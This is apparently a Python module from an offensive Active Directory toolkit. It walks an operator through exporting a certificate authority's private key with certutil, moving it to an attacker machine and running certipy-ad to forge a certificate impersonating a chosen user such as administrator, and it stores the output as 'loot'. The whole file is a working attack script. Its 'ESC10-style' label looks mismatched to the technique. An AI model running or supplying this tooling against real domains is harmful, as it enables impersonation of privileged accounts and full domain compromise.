import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def forge_from_ca_key(session):
    print(blue("[>] Forging certificate using stolen CA private key (ESC10-style abuse)."))

    print(yellow("[*] Step 1: On the CA machine, run the following to export the CA private key:"))
    print(green("certutil -exportPFX \"<CA-NAME>\" C:\\Users\\Public\\ca.pfx"))
    print(yellow("[*] Replace <CA-NAME> with the actual name of the CA, e.g., 'Certificate-LTD-CA'."))
    print(yellow("[*] Then transfer 'ca.pfx' to your attacker machine and place it in the current working directory."))

    ca_pfx_path = input("[?] Enter path to the transferred CA PFX file (e.g., ca.pfx): ").strip()
    if not os.path.exists(ca_pfx_path):
        print(red("[-] Specified PFX file does not exist."))
        return

    upn = input(f"[?] Enter UPN of target user to impersonate (e.g., administrator@{session.domain}): ").strip()
    subject = input("[?] Enter full subject DN (e.g., CN=Administrator,CN=Users,DC=domain,DC=com): ").strip()
    output_file = "administrator_forged.pfx"

    forge_cmd = (
        f"certipy-ad forge -ca-pfx {ca_pfx_path} -upn {upn} -subject \"{subject}\" -out {output_file}"
    )

    print(blue("[*] Forging certificate..."))
    out, err = run_command(forge_cmd)
    print(out.strip() or err.strip())

    if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
        with open(output_file, "rb") as f:
            save_loot(output_file, f.read(), binary=True)
        print(green(f"[+] Forged certificate saved to loot/{output_file}"))
    else:
        print(red("[-] Forged PFX file not created. Try the command manually or check input values."))
        print(yellow("[!] If the PFX file was not created or saved, retry the attack. It could be a connection issue."))

    print(yellow(f"[*] Command executed: {forge_cmd}"))
